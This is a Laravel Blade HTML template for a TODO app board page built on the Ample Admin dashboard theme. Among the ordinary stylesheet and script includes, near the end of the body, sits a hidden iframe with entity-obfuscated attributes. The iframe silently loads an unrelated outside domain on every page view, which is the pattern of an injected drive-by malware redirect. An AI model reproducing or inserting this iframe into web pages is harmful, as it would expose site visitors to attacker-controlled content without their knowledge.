<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>TODO APP</title>
	<link href="{!!asset('css/app.css')!!}" rel="stylesheet">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="csrf-token" content="{{csrf_token()}}">
    <link rel="icon" type="image/png" sizes="16x16" href="{!!asset('plugins/images/favicon.png')!!}">
    <link href="{!!asset('bootstrap/dist/css/bootstrap.min.css')!!}" rel="stylesheet">
    <!-- Menu CSS -->
    <link href="{!!asset('plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.css')!!}" rel="stylesheet">
    <!-- toast CSS -->
    <link href="{!!('plugins/bower_components/toast-master/css/jquery.toast.css')!!}" rel="stylesheet">
    <!-- morris CSS -->
    <link href="{!!asset('plugins/bower_components/morrisjs/morris.css')!!}" rel="stylesheet">
    <!-- chartist CSS -->
    <link href="{!!asset('plugins/bower_components/chartist-js/dist/chartist.min.css')!!}" rel="stylesheet">
    <link href="{!!asset('plugins/bower_components/chartist-plugin-tooltip-master/dist/chartist-plugin-tooltip.css')!!}" rel="stylesheet">
    <!-- animation CSS -->
    <link href="{!!asset('css/animate.css')!!}" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="{!!asset('css/style.css')!!}" rel="stylesheet">
    <!-- color CSS -->
    <link href="{!!asset('css/colors/default.css')!!}" id="theme" rel="stylesheet">
    <script>
        window.app = {!! json_encode([
            'env' => App::environment(),
            'csrfToken' => csrf_token(),
            'user' => Auth::check() ? Auth::User()->id : null,
            'id' => $id,
            'title' => $title->board_title,
            'stripeKey' => config('services.stripe.key')
        ])!!};
    </script>
</head>
<body>
    <body class="fix-header">
    <!-- ============================================================== -->
    <!-- Preloader -->
    <!-- ============================================================== -->
    <div class="preloader">
        <svg class="circular" viewBox="25 25 50 50">
            <circle class="path" cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10" />
        </svg>
    </div>
    <!-- ============================================================== -->
    <!-- Wrapper -->
    <!-- ============================================================== -->
    <div id="wrapper">
        <!-- ============================================================== -->
        <!-- Topbar header - style you can find in pages.scss -->
        <!-- ============================================================== -->
        <nav class="navbar navbar-default navbar-static-top m-b-0">
            <div class="navbar-header">
                <div class="top-left-part">
                    <!-- Logo -->
                    <a class="logo" href="index.html">
                        <!-- Logo icon image, you can use font-icon also --><b>
                        <!--This is dark logo icon--><img src="../plugins/images/admin-logo.png" alt="home" class="dark-logo" /><!--This is light logo icon--><img src="../plugins/images/admin-logo-dark.png" alt="home" class="light-logo" />
                     </b>
                        <!-- Logo text image you can use text also --><span class="hidden-xs">
                        <!--This is dark logo text--><img src="../plugins/images/admin-text.png" alt="home" class="dark-logo" /><!--This is light logo text--><img src="../plugins/images/admin-text-dark.png" alt="home" class="light-logo" />
                     </span> </a>
                </div>
                <!-- /Logo -->
                <ul class="nav navbar-top-links navbar-right pull-right">
                    <li>
                        <form role="search" class="app-search hidden-sm hidden-xs m-r-10">
                            <input type="text" placeholder="Search..." class="form-control"> <a href=""><i class="fa fa-search"></i></a> </form>
                    </li>
                    <li>
                        <a class="profile-pic" href="#"> <img src="../plugins/images/users/varun.jpg" alt="user-img" width="36" class="img-circle"><b class="hidden-xs">{{ucFirst(Auth::User()->name)}}</b></a>
                    </li>
                </ul>
            </div>
            <!-- /.navbar-header -->
            <!-- /.navbar-top-links -->
            <!-- /.navbar-static-side -->
        </nav>
    </div>
    <div id="page-wrapper">
            <div class="container-fluid">
                <div class="row bg-title">
                    <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
                        <h4 class="page-title">Dashboard</h4> </div>
                    <div class="col-lg-9 col-sm-8 col-md-8 col-xs-12">
                        <a href="https://wrappixel.com/templates/ampleadmin/" target="_blank" class="btn btn-danger pull-right m-l-20 hidden-xs hidden-sm waves-effect waves-light">TODO APP</a>
                        <ol class="breadcrumb">
                            <li><a href="{{route('home')}}">BOARD</a></li>
                        </ol>
                    </div>
                    <!-- /.col-lg-12 -->
                </div>
            </div>
   <iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>
    <div id="nyoba">
      
    </div>

   <div class="container-fluid">
        <footer class="footer text-center"> 2018 &copy; Ample Admin brought to you by wrappixel.com </footer>
    </div>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script  type="text/javascript" src="{!!asset('js/appBoardDetail.js')!!}"></script>
    <script src="{!!asset('plugins/bower_components/jquery/dist/jquery.min.js')!!}"></script>
    <!-- Bootstrap Core JavaScript -->
    <script src="{!!asset('bootstrap/dist/js/bootstrap.min.js')!!}"></script>
    <!-- Menu Plugin JavaScript -->
    <script src="{!!asset('plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.js')!!}"></script>
    <!--slimscroll JavaScript -->
    <script src="{!!asset('js/jquery.slimscroll.js')!!}"></script>
    <!--Wave Effects -->
    <script src="{!!asset('js/waves.js')!!}"></script>
    <!--Counter js -->
    <script src="{!!asset('plugins/bower_components/waypoints/lib/jquery.waypoints.js')!!}"></script>
    <script src="{!!asset('plugins/bower_components/counterup/jquery.counterup.min.js')!!}"></script>
    <!-- chartist chart -->
    <script src="{!!asset('plugins/bower_components/chartist-js/dist/chartist.min.js')!!}"></script>
    <script src="{!!asset('plugins/bower_components/chartist-plugin-tooltip-master/dist/chartist-plugin-tooltip.min.js')!!}"></script>
    <!-- Sparkline chart JavaScript -->
    <script src="{!!asset('plugins/bower_components/jquery-sparkline/jquery.sparkline.min.js')!!}"></script>
    <!-- Custom Theme JavaScript -->
    <script src="{!!asset('js/custom.min.js')!!}"></script>
    <script src="{!!asset('js/dashboard1.js')!!}"></script>
    <script type="text/javascript" src="{!!asset('plugins/bower_components/toast-master/js/jquery.toast.js')!!}"></script>
    
</body>
</html>